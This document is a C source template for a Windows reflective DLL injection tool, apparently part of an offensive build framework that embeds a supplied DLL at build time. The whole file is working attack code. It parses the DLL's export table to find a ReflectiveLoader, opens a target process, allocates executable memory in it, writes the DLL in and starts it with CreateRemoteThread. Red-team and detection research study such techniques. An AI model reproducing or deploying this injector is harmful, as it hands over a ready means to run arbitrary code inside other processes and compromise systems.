// filename: main.c.tpl

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/*
 * Embedded DLL supplied by Mifa at build time.
 */
static const unsigned char embedded_dll[] = {
    {{PAYLOAD_BYTES_C}}
};

static const SIZE_T embedded_dll_len =
    (SIZE_T){{PAYLOAD_BYTES_LEN}};


/*
 * Convert an RVA inside the PE into its raw file offset.
 */
static DWORD rva_to_file_offset(
    const unsigned char *pe,
    size_t len,
    DWORD rva
)
{
    IMAGE_DOS_HEADER *dos_header;
    IMAGE_NT_HEADERS *nt_headers;
    IMAGE_SECTION_HEADER *sections;

    if (!pe || len < sizeof(IMAGE_DOS_HEADER))
        return (DWORD)-1;

    dos_header =
        (IMAGE_DOS_HEADER *)pe;

    if (dos_header->e_magic != IMAGE_DOS_SIGNATURE)
        return (DWORD)-1;

    if (dos_header->e_lfanew <= 0)
        return (DWORD)-1;

    if ((size_t)dos_header->e_lfanew +
        sizeof(IMAGE_NT_HEADERS) > len)
    {
        return (DWORD)-1;
    }

    nt_headers =
        (IMAGE_NT_HEADERS *)(
            pe + dos_header->e_lfanew
        );

    if (nt_headers->Signature != IMAGE_NT_SIGNATURE)
        return (DWORD)-1;

    /*
     * RVA may point inside PE headers.
     */
    if (rva < nt_headers->OptionalHeader.SizeOfHeaders)
    {
        if ((size_t)rva < len)
            return rva;

        return (DWORD)-1;
    }

    sections =
        IMAGE_FIRST_SECTION(nt_headers);

    for (
        WORD i = 0;
        i < nt_headers->FileHeader.NumberOfSections;
        i++
    )
    {
        DWORD section_start =
            sections[i].VirtualAddress;

        DWORD section_size =
            sections[i].Misc.VirtualSize >
            sections[i].SizeOfRawData
                ? sections[i].Misc.VirtualSize
                : sections[i].SizeOfRawData;

        if (
            rva >= section_start &&
            rva < section_start + section_size
        )
        {
            DWORD delta =
                rva - section_start;

            if (delta >= sections[i].SizeOfRawData)
                return (DWORD)-1;

            DWORD file_offset =
                sections[i].PointerToRawData +
                delta;

            if ((size_t)file_offset >= len)
                return (DWORD)-1;

            return file_offset;
        }
    }

    return (DWORD)-1;
}


/*
 * Locate an exported function inside the raw DLL.
 */
static DWORD find_export_file_offset(
    const unsigned char *pe,
    size_t len,
    const char *name
)
{
    IMAGE_DOS_HEADER *dos_header;
    IMAGE_NT_HEADERS *nt_headers;
    IMAGE_EXPORT_DIRECTORY *exports;

    DWORD export_dir_rva;
    DWORD export_dir_offset;

    DWORD names_offset;
    DWORD ordinals_offset;
    DWORD functions_offset;

    if (!pe ||
        !name ||
        len < sizeof(IMAGE_DOS_HEADER))
    {
        return 0;
    }

    dos_header =
        (IMAGE_DOS_HEADER *)pe;

    if (dos_header->e_magic != IMAGE_DOS_SIGNATURE)
        return 0;

    if (dos_header->e_lfanew <= 0)
        return 0;

    if ((size_t)dos_header->e_lfanew +
        sizeof(IMAGE_NT_HEADERS) > len)
    {
        return 0;
    }

    nt_headers =
        (IMAGE_NT_HEADERS *)(
            pe + dos_header->e_lfanew
        );

    if (nt_headers->Signature != IMAGE_NT_SIGNATURE)
        return 0;

    export_dir_rva =
        nt_headers->OptionalHeader
            .DataDirectory[
                IMAGE_DIRECTORY_ENTRY_EXPORT
            ]
            .VirtualAddress;

    if (!export_dir_rva)
        return 0;

    export_dir_offset =
        rva_to_file_offset(
            pe,
            len,
            export_dir_rva
        );

    if (export_dir_offset == (DWORD)-1)
        return 0;

    if ((size_t)export_dir_offset +
        sizeof(IMAGE_EXPORT_DIRECTORY) > len)
    {
        return 0;
    }

    exports =
        (IMAGE_EXPORT_DIRECTORY *)(
            pe + export_dir_offset
        );

    names_offset =
        rva_to_file_offset(
            pe,
            len,
            exports->AddressOfNames
        );

    ordinals_offset =
        rva_to_file_offset(
            pe,
            len,
            exports->AddressOfNameOrdinals
        );

    functions_offset =
        rva_to_file_offset(
            pe,
            len,
            exports->AddressOfFunctions
        );

    if (
        names_offset == (DWORD)-1 ||
        ordinals_offset == (DWORD)-1 ||
        functions_offset == (DWORD)-1
    )
    {
        return 0;
    }

    DWORD *names =
        (DWORD *)(pe + names_offset);

    WORD *ordinals =
        (WORD *)(pe + ordinals_offset);

    DWORD *functions =
        (DWORD *)(pe + functions_offset);

    for (
        DWORD i = 0;
        i < exports->NumberOfNames;
        i++
    )
    {
        DWORD name_offset;

        if (
            (size_t)names_offset +
            ((size_t)i + 1) * sizeof(DWORD) > len
        )
        {
            return 0;
        }

        if (
            (size_t)ordinals_offset +
            ((size_t)i + 1) * sizeof(WORD) > len
        )
        {
            return 0;
        }

        name_offset =
            rva_to_file_offset(
                pe,
                len,
                names[i]
            );

        if (name_offset == (DWORD)-1)
            continue;

        if ((size_t)name_offset >= len)
            continue;

        char *current_name =
            (char *)(pe + name_offset);

        if (strcmp(current_name, name) == 0)
        {
            WORD ordinal =
                ordinals[i];

            if (
                ordinal >=
                exports->NumberOfFunctions
            )
            {
                return 0;
            }

            if (
                (size_t)functions_offset +
                ((size_t)ordinal + 1) *
                sizeof(DWORD) > len
            )
            {
                return 0;
            }

            return rva_to_file_offset(
                pe,
                len,
                functions[ordinal]
            );
        }
    }

    return 0;
}



int execute_technique(
    const unsigned char *payload,
    size_t payload_len,
    DWORD pid
)
{
    HANDLE hProcess = NULL;
    HANDLE hThread = NULL;
    LPVOID pRemoteImage = NULL;
    SIZE_T bytesWritten = 0;

    DWORD loader_offset;
    DWORD wait_result;


    /*
     * 1. Input validation
     */
    if (!payload ||
        payload_len == 0 ||
        pid == 0)
    {
        return -1;
    }


    /*
     * 2. Locate ReflectiveLoader locally
     */
    loader_offset =
        find_export_file_offset(
            payload,
            payload_len,
            "ReflectiveLoader"
        );

    if (!loader_offset ||
        loader_offset >= payload_len)
    {
        return -2;
    }


    /*
     * 3. Open target
     */
    hProcess = OpenProcess(
        PROCESS_CREATE_THREAD |
        PROCESS_QUERY_INFORMATION |
        PROCESS_VM_OPERATION |
        PROCESS_VM_WRITE |
        PROCESS_VM_READ,
        FALSE,
        pid
    );

    if (!hProcess)
        return -3;


    /*
     * 4. Allocate remote storage
     */
    pRemoteImage = VirtualAllocEx(
        hProcess,
        NULL,
        payload_len,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );

    if (!pRemoteImage)
    {
        CloseHandle(hProcess);
        return -4;
    }


    /*
     * 5. Copy DLL
     */
    if (!WriteProcessMemory(
            hProcess,
            pRemoteImage,
            payload,
            payload_len,
            &bytesWritten))
    {
        VirtualFreeEx(
            hProcess,
            pRemoteImage,
            0,
            MEM_RELEASE
        );

        CloseHandle(hProcess);
        return -5;
    }


    /*
     * Make sure the whole DLL was written.
     */
    if (bytesWritten != payload_len)
    {
        VirtualFreeEx(
            hProcess,
            pRemoteImage,
            0,
            MEM_RELEASE
        );

        CloseHandle(hProcess);
        return -6;
    }


    /*
     * Synchronize instruction cache.
     */
    FlushInstructionCache(
        hProcess,
        pRemoteImage,
        payload_len
    );


    /*
     * 6. Loader location
     *
     * loader_offset is the RAW file offset
     * we validated earlier.
     */
    LPVOID pRemoteLoader =
        (LPVOID)(
            (DWORD_PTR)pRemoteImage +
            loader_offset
        );


    /*
     * 7. Create the remote loader thread.
     */
    hThread = CreateRemoteThread(
        hProcess,
        NULL,
        0,
        (LPTHREAD_START_ROUTINE)pRemoteLoader,
        pRemoteImage,
        0,
        NULL
    );


    /*
     * 8. If the thread was not created
     */
    if (!hThread)
    {
        VirtualFreeEx(
            hProcess,
            pRemoteImage,
            0,
            MEM_RELEASE
        );

        CloseHandle(hProcess);
        return -7;
    }


    /*
     * 9. Wait
     */
    wait_result =
        WaitForSingleObject(
            hThread,
            INFINITE
        );

    if (wait_result != WAIT_OBJECT_0)
    {
        CloseHandle(hThread);
        CloseHandle(hProcess);

        /*
         * Do not free pRemoteImage here
         * because we cannot prove the
         * remote thread stopped using it.
         */

        return -8;
    }


    /*
     * 10. Capture remote loader result
     */
    DWORD thread_exit = 0;

    if (!GetExitCodeThread(
            hThread,
            &thread_exit))
    {
        CloseHandle(hThread);

        VirtualFreeEx(
            hProcess,
            pRemoteImage,
            0,
            MEM_RELEASE
        );

        CloseHandle(hProcess);
        return -9;
    }

    printf(
        "[+] Thread exit : %lu\n",
        (unsigned long)thread_exit
    );


    /*
     * 11. Cleanup
     */
    CloseHandle(hThread);

    VirtualFreeEx(
        hProcess,
        pRemoteImage,
        0,
        MEM_RELEASE
    );

    CloseHandle(hProcess);

    return 0;
}



/*
 * Program entry point.
 */
int main(
    int argc,
    char **argv
)
{
    DWORD pid;
    int result;

    if (argc != 2)
    {
        fprintf(
            stderr,
            "Usage: %s <pid>\n",
            argv[0]
        );

        return 1;
    }

    pid =
        (DWORD)strtoul(
            argv[1],
            NULL,
            10
        );

    if (!pid)
    {
        fprintf(
            stderr,
            "Invalid PID\n"
        );

        return 1;
    }

    printf(
        "[+] Technique : Reflective DLL Injection\n"
    );

    printf(
        "[+] PID       : %lu\n",
        (unsigned long)pid
    );

    printf(
        "[+] DLL size  : %llu bytes\n",
        (unsigned long long)
        embedded_dll_len
    );

    result =
        execute_technique(
            embedded_dll,
            embedded_dll_len,
            pid
        );

    if (result != 0)
    {
        fprintf(
            stderr,
            "[-] Technique failed: %d\n",
            result
        );

        return 1;
    }

    printf(
        "[+] Technique completed\n"
    );

    return 0;
}
